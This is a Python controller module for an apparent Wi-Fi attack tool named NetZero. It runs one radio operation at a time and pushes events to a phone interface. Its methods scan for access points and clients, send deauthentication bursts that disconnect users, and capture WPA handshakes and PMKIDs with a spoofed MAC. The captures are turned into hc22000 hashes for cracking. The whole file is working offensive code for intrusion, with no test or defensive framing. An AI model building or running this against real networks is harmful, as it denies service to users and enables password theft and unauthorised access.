"""NetZero controller: a single-task state machine driving the radio.

One operation runs at a time on the single radio. Work happens in a worker
thread; progress is pushed to subscribers (the WebSocket layer) through the
injected `emit(event: dict)` callback. Events:

    {"type": "task",    "task": "scanning"|"idle"|...}
    {"type": "status",  "status": "..."}
    {"type": "log",     "msg": "...", "level": "info"|"error"}
    {"type": "network", "network": {idx, bssid, ssid, pwr, channel, crypto}}
    {"type": "client",  "client":  {idx, mac, pwr, bssid, channel}}
    {"type": "capture", "kind": "handshake"|"pmkid", "ok": bool, "file": "..."}
"""

import re
import time
from threading import Event, Thread

from scapy.all import RandMAC, sniff
from scapy.layers.dot11 import Dot11Beacon
from scapy.packet import Packet

from app import attacks, dot11
from app.config import CAPTURE_DIR, CHANNEL_HOP_DELAY, IFACE
from app.hashes import HashStore
from app.radio import channel_hopper, enable_monitor, is_monitor, set_channel


def _safe(name: str) -> str:
    return re.sub(r"[^A-Za-z0-9_-]", "_", name) or "net"


class NetZero:
    def __init__(self, emit):
        self._emit = emit
        self.iface = IFACE
        self.task = "idle"
        self.networks = {}        # bssid -> info
        self.clients = {}         # mac -> info
        self._stop = Event()
        self._worker = None
        self.store = HashStore()
        CAPTURE_DIR.mkdir(parents=True, exist_ok=True)

    def _register_hash(self, pcap, bssid, ssid, kind):
        """Convert a successful capture to hc22000 and announce it."""
        entry = self.store.register(pcap, bssid, ssid, kind)
        if entry:
            self._emit({"type": "hash", "hash": entry})
            self.log(f"Hash extracted → {entry['name']}")
        else:
            self.log(f"{kind} captured but no crackable hash could be extracted.", level="error")

    # --- event helpers --------------------------------------------------------
    def status(self, msg):
        self._emit({"type": "status", "status": msg})

    def log(self, msg, level="info"):
        self._emit({"type": "log", "msg": msg, "level": level})

    def _set_task(self, task):
        self.task = task
        self._emit({"type": "task", "task": task})

    # --- introspection --------------------------------------------------------
    def is_idle(self):
        return self.task == "idle"

    def state(self):
        return {
            "task": self.task,
            "iface": self.iface,
            "monitor": is_monitor(self.iface),
            "networks": len(self.networks),
            "clients": len(self.clients),
        }

    def network_list(self):
        return sorted(self.networks.values(), key=lambda n: n["pwr"], reverse=True)

    # --- lifecycle ------------------------------------------------------------
    def _launch(self, task, target, args=()):
        if not self.is_idle():
            raise RuntimeError(f"Busy: {self.task}")
        self._stop.clear()
        self._set_task(task)

        def runner():
            try:
                enable_monitor(self.iface)
                target(*args)
            except Exception as exc:  # surface to the phone instead of dying silently
                self.log(f"{type(exc).__name__}: {exc}", level="error")
            finally:
                self._set_task("idle")

        self._worker = Thread(target=runner, daemon=True)
        self._worker.start()

    def stop(self):
        if self.is_idle():
            return
        self.status("Stopping…")
        self._stop.set()

    # --- network scan ---------------------------------------------------------
    def start_network_scan(self):
        self._launch("scan_networks", self._scan_networks)

    def _scan_networks(self):
        self.networks = {}
        self.status("Scanning for networks on all channels…")
        with channel_hopper(CHANNEL_HOP_DELAY, self.iface):
            sniff(
                iface=self.iface,
                prn=self._on_beacon,
                store=False,
                stop_filter=lambda p: self._stop.is_set(),
            )
        self.status(f"Scan finished — {len(self.networks)} networks.")

    def _on_beacon(self, packet: Packet):
        # A malformed frame must never raise out of the sniff prn — scapy stops
        # the whole capture if the callback throws.
        try:
            if not dot11.is_beacon(packet):
                return
            bssid = dot11.get_bssid(packet)
            if bssid in self.networks:
                return
            stats = packet[Dot11Beacon].network_stats()
            info = {
                "idx": len(self.networks) + 1,
                "bssid": bssid,
                "ssid": dot11.parse_ssid(stats["ssid"]),
                "pwr": dot11.get_rssi(packet),
                "channel": stats["channel"],
                "crypto": dot11.parse_crypto(stats["crypto"]),
            }
            self.networks[bssid] = info
            self._emit({"type": "network", "network": info})
        except Exception:
            return

    # --- client scan ----------------------------------------------------------
    def start_client_scan(self, bssid, channel):
        self._launch("scan_clients", self._scan_clients, (bssid, channel))

    def _scan_clients(self, bssid, channel):
        self.clients = {}
        set_channel(channel, self.iface)
        self.status(f"Scanning for clients of {bssid} on ch {channel}…")
        sniff(
            iface=self.iface,
            prn=lambda p: self._on_data_frame(p, bssid, channel),
            store=False,
            stop_filter=lambda p: self._stop.is_set(),
        )
        self.status(f"Client scan finished — {len(self.clients)} clients.")

    def _on_data_frame(self, packet: Packet, target_bssid, channel):
        try:
            if getattr(packet, "type", None) != 2:
                return
            bssid, client = dot11.data_frame_endpoints(packet)
            if bssid != target_bssid or not dot11.is_unicast_client(client):
                return
            if client in self.clients:
                return
            info = {
                "idx": len(self.clients) + 1,
                "mac": client,
                "pwr": dot11.get_rssi(packet),
                "bssid": target_bssid,
                "channel": channel,
            }
            self.clients[client] = info
            self._emit({"type": "client", "client": info})
        except Exception:
            return

    # --- deauth ---------------------------------------------------------------
    def start_deauth(self, bssid, client, channel, bursts=3):
        self._launch("deauth", self._deauth, (bssid, client, channel, bursts))

    def _deauth(self, bssid, client, channel, bursts):
        attacks.send_deauth(self.iface, bssid, client, channel, bursts=bursts, log=self.log)
        self.status("Deauth burst complete.")

    # --- handshake ------------------------------------------------------------
    def start_handshake(self, bssid, client, channel, ssid=""):
        self._launch("handshake", self._handshake, (bssid, client, channel, ssid))

    def _handshake(self, bssid, client, channel, ssid):
        outfile = str(CAPTURE_DIR / f"handshake_{_safe(ssid)}_{int(time.time())}.pcap")
        set_channel(channel, self.iface)
        with attacks.capture_handshakes(self.iface, bssid, outfile, log=self.log) as (hs, wait):
            # nudge clients to reconnect so we catch the 4-way handshake
            attacks.send_deauth(self.iface, bssid, client, channel, bursts=2, log=self.log)
            wait()
        ok = any((m["M1"] and m["M2"]) or (m["M2"] and m["M3"]) for m in hs.values())
        self._emit({"type": "capture", "kind": "handshake", "ok": ok,
                    "file": outfile.split("/")[-1] if ok else None})
        if ok:
            self._register_hash(outfile, bssid, ssid, "handshake")

    # --- PMKID ----------------------------------------------------------------
    def start_pmkid(self, bssid, ssid, channel):
        self._launch("pmkid", self._pmkid, (bssid, ssid, channel))

    def _pmkid(self, bssid, ssid, channel):
        bssid = bssid.lower()
        fake_mac = str(RandMAC())
        outfile = str(CAPTURE_DIR / f"pmkid_{_safe(ssid)}_{int(time.time())}.pcap")
        set_channel(channel, self.iface)
        with attacks.capture_pmkid(self.iface, bssid, fake_mac, outfile, log=self.log) as (st, wait):
            attacks.trigger_pmkid(self.iface, bssid, fake_mac, ssid, channel, log=self.log)
            wait()
        self._emit({"type": "capture", "kind": "pmkid", "ok": st["pmkid"],
                    "file": outfile.split("/")[-1] if st["pmkid"] else None})
        if st["pmkid"]:
            self._register_hash(outfile, bssid, ssid, "pmkid")
